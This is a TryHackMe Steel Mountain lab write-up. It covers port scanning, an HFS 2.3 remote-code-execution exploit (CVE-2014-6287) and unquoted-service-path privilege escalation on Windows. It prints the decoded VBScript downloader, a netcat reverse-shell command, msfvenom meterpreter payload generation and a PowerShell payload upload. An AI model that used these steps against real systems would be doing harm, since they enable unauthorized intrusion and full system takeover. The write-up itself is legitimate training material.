<p align="center"><img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.secjuice.com%2Fcontent%2Fimages%2F2019%2F01%2FTryHackMe-logo---small.png&f=1&nofb=1"></p>

# TryHackMe Steel Mountain
Hello and welcome to my first writeup!  This room was a lot of fun and great practice for learning some more enumeration and privilege escalation techniques for Windows systems.  I was proud of finishing this room completely on my own after finishing the TryHackMe Jr. Pentester Path so I decided I might as well make a write-up for the solution I found.

[Here's a link to the Steel Mountain room](https://tryhackme.com/room/steelmountain)

### Table of Contents

- [Recon and Port Scanning](#recon)
- [Initial Access](#initial-access)
- [Post Exploitation and Privilege Escalation](#post-exploitation-and-privilege-escalation)

### Recon

After reading the introduction we're told that this machine does not respond to ping (ICMP), so we will make sure to use the -Pn flag for our port scans.

We're going to start this room with a port scan using `nmap -sS -sV -O -sC -Pn -n <IP>`

A brief explanation for all of the flags I used in the scan:

`-sS`: the TCP SYN scan type is generally a safe flag to use in an initial scan since it doesn't complete the TCP 3-way-handshake, this makes the scan less likely to be logged

`-sV`: this flag will attempt to find the service and the service's version on each port; very useful for finding potential exploitatable services

`-O`: this flag attempts to find the OS; also useful for finding exploits

`-sC`: this flag runs the standard nmap scripts

`-Pn`: this flag tells nmap not to assume a port is closed because it doesn't respond to ping

`-n`: this flag tells nmap to not attempt DNS Resolution, only used this flag because the scan was taking a long time without this flag

<p align="center"> <img src="https://user-images.githubusercontent.com/65551261/156607050-7dcfc2f9-4878-44f0-b4da-4fffe0801bd8.png" align="center"></p>


Several ports were found open with a variety of different services.  Time to take a look and see what we discovered.

- Ports 80 and 8080 are HTTP services with port 8080 hosting HttpFileServer
- Ports 139 and 445 are open hosting SMB
- Port 3389 is open hosing Windows RDP
- Ports 49152 to 49156 as well as port 49156 are open and hosting Windows RPC 

Now that we have discovered quote a few open ports, let's try to explore them for a foothold.

---

### Initial Access

Port 80 and port 8080 both host HTTP services, meaning we can visit them on our browser.  So I checked them both out using firefox.  On port 80, there was a very simple webpage with a Steel Mountain logo as well as a picture of the Employee of the Month.


<p align="center"> <img src="https://user-images.githubusercontent.com/65551261/156625298-59275f31-8d4c-4f02-950b-56732019981d.png"> </p>

This site is completely plain, but I first tried to fuzz for hidden directories using gobuster but I found nothing.

The nmap scan also showed some information about the SMB service, perhaps we can get some information using enum4linux and smbclient, however this was another dead end.

The next step for me was checking out the HttpFileServer on port 8080.  Visitng this on my browser I found the following:

<p align="center"><img src="https://user-images.githubusercontent.com/65551261/156636351-16ea3370-9c12-4a56-b1e7-a3d3a8610725.png"></p>

Now this is interesting!  We can see that this service is using HFS version 2.3 and checking out the HFS homepage we can see that there have been 6 security updates since that version's use.  This is a huge red flag for potential exploits, so I decided to check if there was anything listed in Exploit-DB.  In Exploit-DB, there were 6 exploits listed with 4 of them being for RCE vulnerabilities exploiting CVE-2014-6287.  CVE-2014-6287 shows that HFS fails to handle null bytes in the search string so any commands that follow will be executed on the host system.  Exploit-DB had a python script exploit listed that executes a payload that will connect a reverse shell to a listening port on my machine.

[Here's a link to the Exploit-DB page where I got the script from](https://www.exploit-db.com/exploits/39161)
**However, the script is pretty old and outdated, I have an updated python script compatable for python3 since Kali has officially shifted completely to python3.**

Before executing any exploit, it's best to go through the script to understand exactly what it does and how it does it.  Althought this script is verified on Exploit-DB, it's generally good practice to ensure that when performing a real penetration test that there is nothing unexpected getting executed.  So I'm going to include a section here where I traced the code to see what's going on in this script.

<p align="center"><img src="https://user-images.githubusercontent.com/65551261/156642993-7747da1c-7c14-4bb2-958f-ebfa71e766e7.png"></p>

So, tracing the script we can see some functions getting declared that open URLs using our CLAs of <Target IP address> <Target Port Number> to the directory `/?search=%00{.+"+<some code here>+".}` using the null byte to execute the code on the host system.
  
Then our local ip address and listening port variables are declared along with some vbs and exe strings with special characters being URL-encoded.  These can be read a lot easier by using CyberChef to decode the URL-encoded characters.

**vbs1:**
```vbs
C:\Users\Public\script.vbs|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://" ip_addr "/nc.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\Public\nc.exe", 2 '//overwrite
end with  
```

First this script creates a file in the C:\Users\Public directory called script.vbs and writes to this sript using a pipe.  A variable `xHttp` is declared and is assigned as a Microsoft XMLHTTP object capable of making and receivig HTTP requests. Then a variable called bStrm is declared and is assigned as a Adodb.Stream object which will allow our script to read and write to binary files. Our xHttp object is then used to make a GET request to our local IP address using `http://10.10.xxx.xxx/nc.exe` and a `False` attribute.  Then we use the bStrm object to write the HTTP response to C:\Users\Public\nc.exe.
  
**vbs2:**
```vbs
cscript.exe C:\Users\Public\script.vbs
```

This script uses the Windows cscript.exe process to execute our script.vbs code that was defined previously.
  
**vbs3:**
```vbs
C:\Users\Public\nc.exe -e cmd.exe [IP_ADDRESS] [LOCAL_PORT]
```
  
This script executes the newly created executable file nc.exe with the -e execute flag to run cmd.exe with our local IP and Port.

And we can see that these commands are executed using the null byte RCE vulnerability to create the reverse shell.  Now that we understand what the script does, we can set up a python http server to host our nc.exe on port 80 and create netcat listener to capture our reverse shell.

And here we are!  The initial foothold into the system!
<p align="center"><img src="https://user-images.githubusercontent.com/65551261/156701870-55c79c81-9130-41e1-bbf3-2afb66c51cde.png"></p>

---

### Post Exploitation and Privilege Escalation
  
First thing I want to do is try to upgrade my shell to a more stable meterpreter shell, so I'm going check if I have write permissions in any directories.  IThe first place I checked was C:\Users\bill\Desktop which I had write permissions to.  My next step was to generate a reverse tcp meterpreter shell payload using msfvenom.
  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<4444> -f exe>meterpreter4444.exe`
  
To upload my payload I'm going to use `powershell.exe Invoke-WebRequest -Uri "http://<IP>:<port>/meterpreter4444.exe" -OutFile C:\Users\bill\Desktop\meterpreter4444.exe`

To catch this meterpreter shell I'll use metasploit's multi/handler, so I'll start up msfconsole.

<p align="center"><img src="https://user-images.githubusercontent.com/65551261/156778223-215c3927-70e9-4c8f-9b0b-958562b13902.png"></p>

Use `set LHOST <IP>` to set the IP to your local address, and make sure the port is matching the port our payload will be trying to connect to.  Once the listener is set up, execute the payload uploaded on the windows machine and the meterpreter shell will be established.

Now with a much more stable shell, I began my enumeration.  I first uploaded a winPEAS.bat file to run to see if there were any blatent privilege escalation vectors.  

<p align="center"><img src="https://user-images.githubusercontent.com/65551261/156802046-46196188-627f-443e-b558-4ea2bb5c655f.png"></p>

  A decent number of services are running on unquoted paths, so I check to see if I am able to stop and start any of the services listed.  I have permission to change the state of the service called AdvancedSystemCareService9.  I'm going to upload accesschk.exe to check whether I have write permissions on the unquoted path.
  
Using `accesschk.exe -uwdqs Users c:\*` we can see that we have write permissions in the IObit directory, which we can exploit the unquoted path.  So I'm going to generate another reverse meterpreter with a different port in the directory and upload it as `Advanced.exe`.

After the files is uploaded, we simply open a new metasploit multi handler listener using our new port, restart our AdvancedSystemCareService9 service, and then we receive our new reverse shell which we confirm to be NT AUTHORITY\SYSTEM!  A successful path from foothold to admin!

<p align="center"><img src="https://user-images.githubusercontent.com/65551261/156801721-e027f937-9f23-4e93-a8d7-9e1b191aaa33.png"></p>
  
Thank you for checking out my writeup!~~
  
[My TryHackMe Profile](https://tryhackme.com/p/msherlock9ll96)
